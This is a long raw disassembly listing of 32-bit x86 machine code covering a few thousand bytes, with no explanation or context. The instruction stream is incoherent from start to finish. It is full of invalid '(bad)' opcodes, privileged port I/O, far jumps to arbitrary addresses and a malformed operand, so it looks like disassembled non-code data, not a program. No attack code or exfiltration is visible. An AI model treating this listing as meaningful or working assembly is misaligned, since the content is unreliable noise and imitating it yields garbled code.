  4472de:	mov    ch,BYTE PTR [ebx-0x23803569]
  4472e4:	mov    edi,DWORD PTR ds:0xd8594523
  4472ea:	xor    eax,0xe668dc93
  4472ef:	inc    esp
  4472f0:	mov    ch,0xd1
  4472f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4472f3:	sbb    eax,0x7cdf2f61
  4472f8:	das    
  4472f9:	retf   
  4472fa:	jnp    0x4472fe
  4472fc:	mov    ebx,0x1b0786f2
  447301:	push   edx
  447302:	inc    ebx
  447303:	xor    BYTE PTR [eax],al
  447305:	sub    ch,ch
  447307:	jg     0x44731e
  447309:	mov    ds:0xf420fb25,eax
  44730e:	fstp   DWORD PTR [esi+esi*2]
  447311:	xchg   ebp,eax
  447312:	int3   
  447313:	inc    ecx
  447314:	rcr    DWORD PTR [edi+0x4f8191b7],1
  44731a:	aad    0xaf
  44731c:	push   ds
  44731d:	shl    DWORD PTR [edx-0xe],1
  447320:	ss aas 
  447322:	pop    ds
  447323:	sbb    al,0x36
  447325:	stc    
  447326:	call   0xf401a607
  44732b:	pop    eax
  44732c:	cmp    eax,0x1bbb28a5
  447331:	stc    
  447332:	mov    WORD PTR [edx+0x15edb36f],fs
  447338:	inc    ecx
  447339:	lahf   
  44733a:	dec    ebx
  44733b:	out    0x81,al
  44733d:	dec    esp
  44733e:	jne    0x4472d8
  447340:	inc    eax
  447341:	sub    ebx,DWORD PTR [ebx+0x62]
  447344:	pop    esi
  447345:	in     al,0xb0
  447347:	aam    0xa8
  447349:	jle    0x44735d
  44734b:	sub    esi,DWORD PTR [ebp+0x7bf3d163]
  447351:	clc    
  447352:	push   cs
  447353:	mov    edi,0x460f498d
  447358:	add    bh,BYTE PTR [ebp+eax*4-0x7d]
  44735c:	sahf   
  44735d:	sbb    edx,ebp
  44735f:	out    0x75,eax
  447361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447362:	dec    ebx
  447363:	mov    al,ds:0x7870fb43
  447368:	das    
  447369:	les    ebp,FWORD PTR [ebx-0x3f884189]
  44736f:	fs dec esp
  447371:	icebp  
  447372:	add    al,BYTE PTR [esp+esi*8]
  447375:	sahf   
  447376:	mov    ebx,0x3548e953
  44737b:	rcl    BYTE PTR [eax-0x24a0a172],1
  447381:	jo     0x4473ff
  447383:	push   ss
  447384:	es push cs
  447386:	mov    bl,0x4
  447388:	shl    BYTE PTR [ebx-0x4a93ff65],1
  44738e:	ret    0xa4d1
  447391:	and    ebp,0xffffffe2
  447394:	and    eax,0x1d66a877
  447399:	jns    0x4473ca
  44739b:	scas   al,BYTE PTR es:[edi]
  44739c:	test   al,0xb5
  44739e:	inc    edi
  44739f:	mov    dl,0x1f
  4473a1:	mov    cl,0x0
  4473a3:	shl    DWORD PTR [ebp+0x5eb1bea9],0x70
  4473aa:	mov    esp,0x20eb5bf4
  4473af:	stos   BYTE PTR es:[edi],al
  4473b0:	adc    eax,0x60f2590a
  4473b5:	es jle 0x447437
  4473b8:	add    bl,BYTE PTR [ebp-0x557a846e]
  4473be:	fsubp  st(6),st
  4473c0:	and    ch,BYTE PTR [ebx+0x2a75a916]
  4473c6:	pop    ecx
  4473c7:	in     al,dx
  4473c8:	sub    eax,0x1f1111d5
  4473cd:	sbb    DWORD PTR [edx],edx
  4473cf:	stos   BYTE PTR es:[edi],al
  4473d0:	and    DWORD PTR [edx-0x5d],0xc125fdf
  4473d7:	push   ds
  4473d8:	dec    ecx
  4473d9:	pushf  
  4473da:	js     0x447387
  4473dc:	imul   BYTE PTR [eax-0x4b]
  4473df:	out    0x8b,eax
  4473e1:	imul   ecx,DWORD PTR ds:0xbc059052,0xbb416a5a
  4473eb:	xchg   ecx,eax
  4473ec:	xchg   ebp,eax
  4473ed:	(bad)  
  4473f0:	or     BYTE PTR gs:[ecx],ch
  4473f3:	push   0xd5421aea
  4473f8:	sbb    bl,ch
  4473fa:	(bad)  
  4473fc:	addr16 nop
  4473fe:	out    0xe0,eax
  447400:	push   es
  447401:	iret   
  447402:	jnp    0x447427
  447404:	ds dec ebp
  447406:	sub    eax,0x3755dc14
  44740b:	or     ebp,DWORD PTR ds:[esi+0x99c64c2]
  447412:	mov    BYTE PTR ds:0x88b19021,cl
  447418:	mov    bh,0x37
  44741a:	add    ebx,edi
  44741c:	xor    DWORD PTR [ebx-0x5d0a1a45],0x7cfe2e76
  447426:	mov    esi,0x53801334
  44742b:	and    eax,0xe4fdbb45
  447430:	imul   edx,DWORD PTR [ebx],0xe0539d81
  447436:	and    al,0x7f
  447438:	les    ebx,FWORD PTR [ebx-0x7392fb48]
  44743e:	(bad)  
  44743f:	aas    
  447440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447441:	stc    
  447442:	gs in  eax,0xdd
  447445:	pop    ds
  447446:	nop
  447447:	mov    ch,BYTE PTR [ecx+ebp*1]
  44744a:	mov    ch,0xd5
  44744c:	ret    0x3101
  44744f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447451:	xlat   BYTE PTR ds:[ebx]
  447452:	stc    
  447453:	pop    eax
  447454:	fwait
  447455:	sub    esi,DWORD PTR [edi+0x2f2d132c]
  44745b:	cmovge edi,ecx
  44745e:	jne    0x447443
  447460:	call   0x5f010f0e
  447465:	daa    
  447466:	(bad)  
  447467:	out    dx,eax
  447468:	mov    dh,0x7d
  44746a:	shr    BYTE PTR [eax*1-0x3cc05c65],cl
  447471:	test   DWORD PTR [esi-0x15c6dc94],ebp
  447477:	dec    ebx
  447478:	lds    edi,FWORD PTR [ecx+0x1f00b293]
  44747e:	fidiv  DWORD PTR [ebx+0x55]
  447481:	adc    BYTE PTR [ebx],dl
  447483:	(bad)  
  447484:	fcom   QWORD PTR [edx]
  447486:	outs   dx,BYTE PTR ds:[esi]
  447487:	aaa    
  447488:	sbb    BYTE PTR [ebx+0x52],al
  44748b:	cdq    
  44748c:	mov    ch,0xa3
  44748e:	xchg   edx,eax
  44748f:	lock inc eax
  447491:	sbb    al,0x44
  447493:	pop    ss
  447494:	mov    ah,0x9
  447496:	mov    cl,0xfd
  447498:	mov    ds:0x7a7e5ba7,al
  44749d:	cs int 0x93
  4474a0:	mov    ebp,0x6c796ba0
  4474a5:	mov    DWORD PTR [eax-0xd],ecx
  4474a8:	mov    dh,0xa9
  4474aa:	jmp    0xb772:0xc475825b
  4474b1:	fidivr WORD PTR [esi-0x661c4a9c]
  4474b7:	mov    DWORD PTR [ebp+0x61],esp
  4474ba:	(bad)  
  4474bb:	jmp    0x460d4557
  4474c0:	inc    esi
  4474c1:	mov    ecx,0xb5d7e724
  4474c6:	mov    edi,0xb51b0377
  4474cb:	cdq    
  4474cc:	outs   dx,BYTE PTR ds:[esi]
  4474cd:	mov    ds:0x2013d9fb,al
  4474d2:	fs mov dh,0x8d
  4474d5:	sbb    bh,ch
  4474d7:	les    eax,FWORD PTR [edx+0x6a54b535]
  4474dd:	xchg   edi,eax
  4474de:	sbb    BYTE PTR [eax+0x45],dl
  4474e1:	aas    
  4474e2:	xor    ah,dh
  4474e4:	popf   
  4474e5:	add    al,0x5a
  4474e8:	pop    ebp
  4474e9:	xchg   edi,eax
  4474ea:	xor    ecx,DWORD PTR [ebx-0x10]
  4474ed:	jmp    0x18a:0xcd1ac455
  4474f4:	pusha  
  4474f5:	cmp    dh,BYTE PTR [eax+0x7577d552]
  4474fb:	call   0xee14e38d
  447500:	sbb    eax,0xfd596d59
  447505:	pop    es
  447506:	pusha  
  447507:	(bad)  
  447508:	ja     0x4474a8
  44750a:	retf   
  44750b:	gs cwde 
  44750d:	bound  esi,QWORD PTR [edx-0x48fe9e0a]
  447513:	fadd   DWORD PTR [ebx+0x264ba5b]
  447519:	shr    DWORD PTR [esi-0x260c8add],1
  44751f:	in     al,0xd5
  447521:	ret    
  447522:	test   eax,0xe7291ea6
  447527:	add    dh,BYTE PTR [edx-0x6e30aad9]
  44752d:	stos   BYTE PTR es:[edi],al
  44752e:	jnp    0x447522
  447530:	push   esi
  447531:	cmp    DWORD PTR [edi],ebx
  447533:	scas   al,BYTE PTR es:[edi]
  447534:	push   0x940beeae
  447539:	addr16 js 0x44752e
  44753c:	inc    ebx
  44753d:	ror    edi,1
  44753f:	xor    al,0xca
  447541:	fist   WORD PTR ds:0x3bf0ed47
  447547:	xchg   edx,eax
  447548:	call   0x9e1f1113
  44754d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44754e:	jg     0x447542
  447550:	sub    eax,0x629c09a9
  447555:	pop    ebx
  447556:	int3   
  447557:	jle    0x447534
  447559:	out    0x1e,al
  44755b:	jg     0x4475d2
  44755d:	xor    eax,0xecb5eaa0
  447562:	mov    eax,DWORD PTR [edi-0x7b]
  447565:	cli    
  447566:	push   esi
  447567:	xchg   ecx,eax
  447569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44756a:	fistp  DWORD PTR [ecx+0x1e9e079]
  447570:	call   0x75dd6091
  447575:	iret   
  447576:	mov    ds:0xfbf37af0,al
  44757b:	or     BYTE PTR [edi-0x41],ah
  44757e:	mov    eax,0x55ce91cc
  447583:	in     eax,0xc8
  447585:	push   edi
  447586:	dec    edi
  447587:	clc    
  447588:	in     eax,dx
  447589:	cld    
  44758a:	adc    al,0x57
  44758c:	add    ebp,DWORD PTR [esp+edi*4-0x5c]
  447590:	or     eax,0x121bfba5
  447595:	pop    ds
  447596:	aad    0xfb
  447598:	xor    al,0xb2
  44759a:	push   0xffffffaa
  44759c:	sahf   
  44759d:	inc    esp
  44759e:	mov    ebp,0xa81a7e74
  4475a3:	test   eax,0xf3df0fc5
  4475a8:	push   ecx
  4475a9:	xchg   ebp,ebx
  4475ab:	fcom   QWORD PTR [ecx+0x19]
  4475ae:	retf   
  4475af:	cwde   
  4475b0:	div    DWORD PTR [esi-0x7f]
  4475b3:	mov    esi,0x9107cb25
  4475b8:	and    al,dl
  4475ba:	mov    ?,WORD PTR [edx-0x6b]
  4475bd:	pop    ss
  4475be:	pop    ds
  4475bf:	out    0x22,eax
  4475c1:	out    0x64,eax
  4475c3:	sbb    BYTE PTR [bx+di-0x48d0],cl
  4475c8:	fcomp  DWORD PTR [eax-0x5f0cbfa5]
  4475ce:	dec    ebx
  4475cf:	(bad)  
  4475d0:	mov    eax,ds:0x76315957
  4475d5:	call   0x43b53f67
  4475da:	stc    
  4475db:	adc    eax,0xc23d9699
  4475e0:	and    ebp,esi
  4475e2:	loope  0x4475ea
  4475e4:	jmp    0x56297465
  4475e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4475ea:	inc    ebx
  4475eb:	out    0x56,al
  4475ed:	daa    
  4475ee:	dec    ebp
  4475ef:	lahf   
  4475f0:	sbb    ch,BYTE PTR [ecx]
  4475f2:	mov    ch,0xa2
  4475f4:	push   edx
  4475f5:	and    al,0x15
  4475f7:	out    0xa4,al
  4475f9:	lock jb 0x4475d0
  4475fc:	add    eax,0x61e6ed3b
  447601:	xor    DWORD PTR [eax],edi
  447603:	mov    BYTE PTR [edi],dl
  447605:	or     DWORD PTR [esi-0x4c2e37b5],esp
  44760b:	dec    esp
  44760c:	rcr    DWORD PTR [ecx-0x9d8faf5],cl
  447612:	adc    dh,0x64
  447615:	rcl    DWORD PTR [edx+edi*2-0x41],1
  447619:	jno    0x4475d6
  44761b:	je     0x4475f5
  44761d:	(bad)  
  44761e:	sbb    DWORD PTR [edi-0x5097d34a],esp
  447624:	std    
  447625:	mov    ebp,0x2fcbdefe
  44762a:	mov    bh,0xd4
  44762c:	sbb    BYTE PTR [eax],0xd8
  44762f:	hlt    
  447630:	or     BYTE PTR gs:[ebx+esi*8],al
  447634:	or     al,0x20
  447636:	pop    esi
  447637:	sub    BYTE PTR [ecx],0xc9
  44763a:	call   0x634323d5
  44763f:	(bad)  
  447640:	and    eax,DWORD PTR [ecx-0x63]
  447643:	pop    ecx
  447644:	adc    esp,DWORD PTR [esi+0x11]
  447647:	push   0x21
  447649:	sbb    DWORD PTR [eax-0x42],esi
  44764c:	and    ah,BYTE PTR [ebx+0x77]
  44764f:	stos   DWORD PTR es:[edi],eax
  447650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  447652:	mov    ebx,0xe3287aa0
  447657:	call   DWORD PTR [edi-0x301ea757]
  44765d:	test   BYTE PTR [eax-0x21579fec],bh
  447663:	xchg   esi,eax
  447664:	and    al,0x7f
  447666:	pushf  
  447667:	dec    ebx
  447668:	(bad)  [eax-0x32]
  44766b:	jae    0x4476da
  44766d:	or     BYTE PTR [esi+0x71920e6],dh
  447673:	xchg   ecx,eax
  447674:	jae    0x447696
  447676:	jg     0x44765a
  447678:	jl     0x44761a
  44767a:	jnp    0x44763d
  44767c:	jns    0x447618
  44767e:	mov    esi,0xaf8be901
  447683:	jp     0x44767c
  447685:	in     al,dx
  447686:	mov    dh,0xc4
  447688:	sub    edi,ecx
  44768a:	ja     0x447626
  44768c:	push   esi
  44768d:	sbb    al,0xda
  44768f:	sbb    BYTE PTR [esi+0x6a],ch
  447692:	fsubr  st,st(2)
  447694:	dec    ebp
  447695:	stc    
  447696:	mov    dl,0x6c
  447698:	stos   BYTE PTR es:[edi],al
  447699:	or     eax,0x24ac84eb
  44769e:	jmp    0x447665
  4476a0:	dec    ecx
  4476a1:	js     0x4476e0
  4476a3:	out    0xff,al
  4476a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4476a6:	pop    ss
  4476a7:	jne    0x44771a
  4476a9:	js     0x4476d2
  4476ab:	ds (bad) 
  4476ad:	or     ah,dh
  4476af:	shl    BYTE PTR ds:0xe479df65,0xa5
  4476b6:	rcl    BYTE PTR [edx+0xa8a79bd],1
  4476bc:	adc    eax,0xadeb96c2
  4476c1:	popa   
  4476c2:	lock rcr BYTE PTR [ebx],0x9
  4476c6:	fwait
  4476c7:	xchg   esi,eax
  4476c9:	icebp  
  4476ca:	sahf   
  4476cb:	add    BYTE PTR [edx],0xa1
  4476ce:	sti    
  4476cf:	clc    
  4476d0:	ret    
  4476d1:	mov    BYTE PTR [ecx+0x4b],dl
  4476d4:	in     al,0x1a
  4476d6:	addr16 inc edi
  4476d8:	sbb    ch,BYTE PTR [ecx-0x3b]
  4476db:	mov    esp,DWORD PTR [edi-0x72b7ace0]
  4476e1:	popf   
  4476e2:	stos   DWORD PTR es:[edi],eax
  4476e3:	sub    edi,DWORD PTR [eax]
  4476e5:	cmp    BYTE PTR [eax-0x14],ch
  4476e8:	jmp    0x447703
  4476ea:	je     0x4476fb
  4476ec:	ins    BYTE PTR es:[edi],dx
  4476ed:	pop    ebx
  4476ee:	ret    
  4476ef:	and    al,0xfd
  4476f1:	cmp    ebx,DWORD PTR ds:0x311fa93b
  4476f7:	sbb    DWORD PTR [eax],0x14975d09
  4476fd:	mov    eax,0x173a7f83
  447702:	loopne 0x4476ba
  447704:	sbb    DWORD PTR [ecx+0x2c105c12],ebp
  44770a:	cmovb  edi,edx
  44770d:	mov    ds:0x28ca31fb,eax
  447712:	fs stos DWORD PTR es:[edi],eax
  447714:	fild   DWORD PTR [eax+ebp*4]
  447717:	js     0x4476ca
  447719:	inc    ebx
  44771a:	mov    ch,0xb4
  44771c:	ss out 0x67,eax
  44771f:	jae    0x4476f6
  447721:	fwait
  447722:	dec    ebx
  447723:	dec    ebx
  447724:	shl    ebx,cl
  447726:	(bad)  
  447727:	jb     0x4476f9
  447729:	add    ch,cl
  44772b:	loop   0x447754
  44772d:	dec    edi
  44772e:	mov    cl,0x84
  447730:	lock or eax,0xb765f929
  447736:	fucomp st(0)
  447738:	lods   eax,DWORD PTR ds:[esi]
  447739:	inc    ebp
  44773a:	cld    
  44773b:	aam    0x1d
  44773d:	leave  
  44773e:	mov    ebp,edi
  447740:	(bad)  
  447742:	cld    
  447743:	pop    esi
  447744:	nop
  447745:	pushf  
  447746:	sbb    edx,DWORD PTR [eiz*2-0x14c43c86]
  44774d:	retf   
  44774e:	scas   eax,DWORD PTR es:[edi]
  44774f:	or     eax,0xd4bdd8a4
  447754:	idiv   BYTE PTR [esi+0x4055aea]
  44775a:	jno    0x447749
  44775c:	jmp    0x4477bf
  44775e:	in     al,dx
  44775f:	rcr    BYTE PTR [ecx],0x69
  447762:	call   0xbaf1f410
  447767:	and    BYTE PTR [ecx-0x38],0xaa
  44776b:	fistp  DWORD PTR [eax-0x69d027ec]
  447771:	sbb    ebx,0x38
  447774:	and    eax,0xab9c5ec5
  447779:	bound  ebp,QWORD PTR [ebx+0x63]
  44777c:	and    eax,0xceeeb1c2
  447781:	cmp    BYTE PTR [esi+0x5e],0x9e
  447785:	mov    esi,DWORD PTR [edi-0x39f6de36]
  44778b:	xchg   edx,eax
  44778c:	call   0x743f96da
  447791:	jecxz  0x44775c
  447793:	or     eax,0xb28cae9b
  447798:	dec    ecx
  447799:	in     al,0xc3
  44779b:	push   esp
  44779c:	mov    ch,0xe4
  44779e:	test   al,0x1e
  4477a0:	dec    esi
  4477a1:	mov    edx,0x19ccd0f2
  4477a6:	sahf   
  4477a7:	push   ds
  4477a8:	add    eax,0xbfefbf0b
  4477ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4477ae:	sbb    esp,DWORD PTR [ebx+ebp*4]
  4477b1:	js     0x447831
  4477b3:	xlat   BYTE PTR ds:[bx]
  4477b5:	push   eax
  4477b6:	addr16 jne 0x4477cf
  4477b9:	test   eax,0xbcca241d
  4477be:	sub    DWORD PTR [ebp-0x65],edi
  4477c1:	mov    ds:0x33251aeb,eax
  4477c6:	test   al,0x28
  4477c8:	push   ds
  4477c9:	add    al,0x94
  4477cb:	loope  0x447764
  4477cd:	mov    edi,0xd29574bb
  4477d2:	push   ss
  4477d3:	loope  0x4477e2
  4477d5:	push   ds
  4477d6:	nop
  4477d7:	int3   
  4477d8:	cmp    BYTE PTR [edx-0x3c],bl
  4477db:	shl    BYTE PTR ds:0x6f3f2a6,cl
  4477e1:	add    al,0xc2
  4477e3:	jmp    0xc502221f
  4477e8:	xchg   esp,eax
  4477e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4477ea:	mov    bh,0xa9
  4477ec:	xchg   ebp,eax
  4477ed:	xor    esp,edx
  4477ef:	in     eax,dx
  4477f0:	stos   BYTE PTR es:[edi],al
  4477f1:	pop    edi
  4477f2:	inc    edi
  4477f3:	inc    ebx
  4477f4:	sbb    cl,BYTE PTR [ecx-0x4b420071]
  4477fa:	add    al,0xe8
  4477fc:	or     esp,ebx
  4477fe:	cmp    DWORD PTR [ecx-0x4d5466cb],edi
  447804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  447805:	and    al,0x5b
  447807:	mov    BYTE PTR [ebp-0x7f],dl
  44780a:	adc    eax,0xea2a270b
  44780f:	aam    0x2d
  447811:	sbb    al,0x1b
  447813:	test   BYTE PTR [edi+edi*8],al
  447816:	xchg   edx,eax
  447817:	sbb    eax,0x7e9b36
  44781c:	or     BYTE PTR [edi],0x5b
  44781f:	cmp    eax,0xb0552fa4
  447824:	pop    esp
  447825:	or     al,0xb9
  447827:	push   esp
  447828:	fmul   DWORD PTR [ebx+edi*1+0x6f]
  44782c:	jne    0x4478a3
  44782e:	mov    esi,0x5dbe50ed
  447833:	dec    esp
  447834:	sbb    DWORD PTR [esp+eax*8],edx
  447837:	sti    
  447838:	fnstcw WORD PTR [edx]
  44783a:	fwait
  44783b:	adc    ecx,DWORD PTR [ecx-0x47]
  44783e:	retf   0xe5e4
  447841:	sbb    DWORD PTR [edx+0xba81147],edi
  447847:	test   DWORD PTR [ebp+ebp*8-0x18],ebx
  44784b:	xchg   esi,eax
  44784c:	and    BYTE PTR [esi-0x9],dl
  44784f:	jns    0x447812
  447851:	aad    0xbe
  447853:	mov    ah,0x68
  447855:	push   edx
  447856:	test   al,0xe7
  447858:	(bad)  
  447859:	leave  
  44785a:	shl    al,cl
  44785c:	aaa    
  44785d:	fwait
  44785e:	stos   DWORD PTR es:[edi],eax
  44785f:	sbb    esi,ecx
  447861:	out    0xfd,al
  447863:	rcr    DWORD PTR [edi],cl
  447865:	test   eax,0x9167e676
  44786a:	retf   
  44786b:	addr16 iret 
  44786d:	fwait
  44786e:	jmp    0x4478b3
  447870:	(bad)  
  447872:	pop    ebx
  447873:	outs   dx,DWORD PTR ds:[esi]
  447874:	ins    DWORD PTR es:[edi],dx
  447875:	mov    al,0x61
  447877:	pop    ds
  447878:	lods   al,BYTE PTR ds:[esi]
  447879:	aaa    
  44787a:	mov    ecx,0xe604dd94
  44787f:	out    0x65,eax
  447881:	pushf  
  447882:	imul   edx,DWORD PTR [edx],0xffffffc6
  447885:	mov    BYTE PTR ds:0x68ab4b07,al
  44788b:	xor    DWORD PTR [edi-0x6b0b4353],eax
  447891:	ror    BYTE PTR [eax-0x73],1
  447894:	lds    edx,FWORD PTR [ecx-0x2d8b061a]
  44789a:	pop    esi
  44789b:	mul    DWORD PTR [ebp-0x5e]
  44789e:	in     eax,dx
  44789f:	inc    di
  4478a1:	push   DWORD PTR [esp+eax*4-0x47259eb1]
  4478a8:	in     eax,0x74
  4478aa:	into   
  4478ab:	call   0xf300cd8e
  4478b0:	pop    ds
  4478b1:	sub    DWORD PTR [ebx],ecx
  4478b3:	sbb    dl,dh
  4478b5:	lods   al,BYTE PTR ds:[esi]
  4478b6:	pop    eax
  4478b7:	ret    0x993b
  4478ba:	mov    edx,edx
  4478bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4478bd:	or     edi,ecx
  4478bf:	rcr    dl,cl
  4478c1:	sti    
  4478c2:	shl    BYTE PTR [esi+0x74b68044],cl
  4478c8:	not    DWORD PTR [esi-0x38791c2b]
  4478ce:	inc    esp
  4478cf:	pop    esp
  4478d0:	sbb    esi,ecx
  4478d2:	xchg   edx,eax
  4478d3:	dec    esi
  4478d4:	xor    BYTE PTR [edi+ebp*4],0x4
  4478d8:	arpl   WORD PTR [edx],ax
  4478da:	(bad)  [esi-0x5b41403b]
  4478e0:	xchg   DWORD PTR [esi+0x6c9751f2],ebp
  4478e6:	push   ebx
  4478e7:	scas   al,BYTE PTR es:[edi]
  4478e8:	fabs   
  4478ea:	std    
  4478eb:	out    dx,eax
  4478ec:	xchg   ebp,eax
  4478ed:	in     al,dx
  4478ee:	xor    ebp,eax
  4478f0:	test   BYTE PTR [esi-0x6ac0a97],0x39
  4478f7:	ret    
  4478f8:	xchg   ebx,eax
  4478f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4478fa:	push   esp
  4478fb:	imul   edi,DWORD PTR [eax-0x69],0xfe516833
  447902:	into   
  447903:	aam    0x7a
  447905:	add    dl,BYTE PTR [ecx+0x7ba5b438]
  44790b:	aam    0xdc
  44790d:	jmp    0xf4a8d636
  447912:	jne    0x44790a
  447914:	sbb    DWORD PTR [edi+0x61f864bd],eax
  44791a:	mov    DWORD PTR [edi-0xfced08b],ecx
  447920:	fisub  DWORD PTR [ebp+0x2c]
  447923:	and    BYTE PTR [eax],ah
  447925:	cmp    DWORD PTR [esp+esi*8+0x6eec25ab],ebp
  44792c:	pop    esi
  44792d:	test   al,0xb
  44792f:	mov    ebp,DWORD PTR [edi-0x74]
  447932:	jl     0x4478ef
  447934:	(bad)  
  447935:	jae    0x4478eb
  447937:	add    esp,DWORD PTR [ebx]
  447939:	repz mov dl,0x64
  44793c:	bound  esi,QWORD PTR [ecx-0x23]
  44793f:	retf   0x6247
  447942:	dec    eax
  447943:	retf   0xcb39
  447946:	test   al,0xf4
  447948:	sbb    DWORD PTR [edx],0xa9445e5e
  44794e:	mov    edi,eax
  447950:	jp     0x4479cb
  447952:	scas   al,BYTE PTR es:[edi]
  447953:	sbb    DWORD PTR [esi+eax*2+0x9],esp
  447957:	and    DWORD PTR [ebp+0x55],edx
  44795a:	sbb    ch,al
  44795c:	jge    0x447954
  44795e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44795f:	retf   0x3919
  447962:	mov    edi,0x2142477c
  447967:	outs   dx,BYTE PTR ds:[esi]
  447968:	out    0xa8,al
  44796a:	jnp    0x447943
  44796c:	loope  0x4479a4
  44796e:	ficomp WORD PTR [esi-0x3fd06d08]
  447974:	std    
  447975:	stc    
  447976:	shl    DWORD PTR [ebx+0x2e0fa5f5],1
  44797c:	or     DWORD PTR [eax+0x6d],ebx
  44797f:	add    al,0x55
  447981:	call   0x7322:0x27b1a51b
  447988:	retf   0x648b
  44798b:	fstp   TBYTE PTR [eax-0x30]
  44798e:	mov    ebx,0x3de39c64
  447993:	jmp    0x8ea7950e
  447998:	mov    esp,DWORD PTR [ebx+edi*2+0xd7cfd9d]
  44799f:	or     DWORD PTR [ecx+edi*2],ebx
  4479a2:	int3   
  4479a3:	ficomp DWORD PTR [edi+0x3ec2d58d]
  4479a9:	jns    0x447937
  4479ab:	mov    ah,0x31
  4479ad:	inc    ecx
  4479ae:	push   esi
  4479af:	lea    ebx,[edi+ebp*8]
  4479b2:	jmp    0x44793c
  4479b4:	sbb    esp,ebx
  4479b6:	jmp    0xd49e0ade
  4479bb:	add    eax,DWORD PTR [edx]
  4479bd:	or     edx,DWORD PTR [eax-0x4b7165bd]
  4479c3:	aaa    
  4479c4:	jbe    0x44799d
  4479c6:	mov    al,ds:0x714c456
  4479cb:	loop   0x4479a8
  4479cd:	xor    eax,0xd919e4f6
  4479d2:	mov    ah,0xf6
  4479d4:	sbb    bl,al
  4479d6:	mov    esi,0x7bcaf21a
  4479db:	pop    ebx
  4479dc:	or     al,0xfc
  4479de:	or     ax,0x5817
  4479e2:	stc    
  4479e3:	jle    0x4479fc
  4479e5:	test   eax,0x51954c78
  4479ea:	(bad)  
  4479eb:	scas   al,BYTE PTR es:[edi]
  4479ec:	rcr    BYTE PTR [edi+0x7e4b05b],1
  4479f2:	out    0x99,eax
  4479f4:	jmp    0x447a39
  4479f6:	cmp    DWORD PTR [ebx],eax
  4479f8:	pop    edi
  4479f9:	sub    DWORD PTR [ebx+0x259c2454],edi
  4479ff:	mov    eax,0xedb7e5b5
  447a04:	inc    edx
  447a05:	mov    ebp,0xfeb7a96a
  447a0a:	outs   dx,BYTE PTR ds:[esi]
  447a0b:	daa    
  447a0c:	pop    ds
  447a0d:	jns    0x447a47
  447a0f:	jae    0x447a74
  447a11:	sar    BYTE PTR [ebx+0x28],1
  447a14:	and    ebp,DWORD PTR [ecx-0x73]
  447a17:	fistp  DWORD PTR [esi+0x17864da5]
  447a1d:	shr    DWORD PTR [ebx],cl
  447a1f:	push   ss
  447a20:	sub    DWORD PTR [edx+eiz*2],eax
  447a23:	adc    eax,0xab29f5b5
  447a28:	xchg   esp,eax
  447a29:	aam    0xe5
  447a2b:	stos   DWORD PTR es:[edi],eax
  447a2c:	sub    BYTE PTR [edi+0x21e284e1],cl
  447a32:	pop    edx
  447a33:	cmp    BYTE PTR [ebp+0x29ef7ba1],0x7
  447a3a:	outs   dx,BYTE PTR ds:[esi]
  447a3b:	dec    edi
  447a3c:	in     al,0x85
  447a3e:	xchg   ecx,esp
  447a40:	cmp    eax,0x47cc888a
  447a45:	cdq    
  447a46:	outs   dx,DWORD PTR ds:[esi]
  447a47:	ret    0xc9e4
  447a4a:	lds    ebx,FWORD PTR ds:0xe890d002
  447a50:	adc    eax,0x5ef3cb12
  447a55:	fbstp  TBYTE PTR [ecx+edi*4-0x1e]
  447a59:	sub    ch,dl
  447a5b:	mov    ebx,DWORD PTR [esi]
  447a5d:	stc    
  447a5e:	ins    DWORD PTR es:[edi],dx
  447a5f:	cmp    cl,BYTE PTR [ebp+0x18]
  447a62:	aad    0xd0
  447a64:	leave  
  447a65:	cmp    eax,0x3d3b7879
  447a6a:	mov    ebp,0xa665bce4
  447a6f:	mov    ah,0x9f
  447a71:	xchg   ebx,eax
  447a72:	mov    bl,0x44
  447a74:	and    eax,0x85131048
  447a79:	sahf   
  447a7a:	dec    ebx
  447a7b:	push   ebx
  447a7c:	jle    0x447a59
  447a7e:	test   DWORD PTR [ecx],edx
  447a80:	fld    TBYTE PTR [esi-0x9]
  447a83:	pop    ebx
  447a84:	cmp    DWORD PTR [esi-0x48],esp
  447a87:	in     al,0xef
  447a89:	jl     0x447a75
  447a8b:	mov    WORD PTR [esi-0x1efc296c],fs
  447a91:	and    edi,DWORD PTR [esi-0x6dd68c67]
  447a97:	ins    BYTE PTR es:[edi],dx
  447a98:	rcr    DWORD PTR [ebx-0x425137a5],0x9f
  447a9f:	aam    0x51
  447aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  447aa2:	dec    ebx
  447aa3:	ds int 0x87
  447aa6:	push   cs
  447aa7:	sbb    eax,0x999b39a6
  447aac:	lock dec edx
  447aae:	sti    
  447aaf:	jbe    0x447ab9
  447ab1:	imul   esi,DWORD PTR [esi+0x5bb89884],0x9e71e653
  447abb:	sub    al,BYTE PTR [edi-0x25]
  447abe:	cli    
  447abf:	das    
  447ac0:	js     0x447acc
  447ac2:	dec    ebp
  447ac3:	add    DWORD PTR [ecx],ebx
  447ac5:	sbb    DWORD PTR [ecx+0x5],esi
  447ac8:	ret    0xc848
  447acb:	gs in  eax,dx
  447acd:	mov    BYTE PTR [edi],bl
  447acf:	mov    bl,0x6c
  447ad1:	mov    eax,ds:0x105abe49
  447ad6:	push   0xe1c403c1
  447adb:	std    
  447adc:	inc    edx
  447add:	sbb    cl,BYTE PTR [eax+esi*4+0x4bd38e6]
  447ae4:	cwde   
  447ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  447ae6:	mov    esp,0xf69c666b
  447aeb:	pop    ss
  447aec:	dec    esi
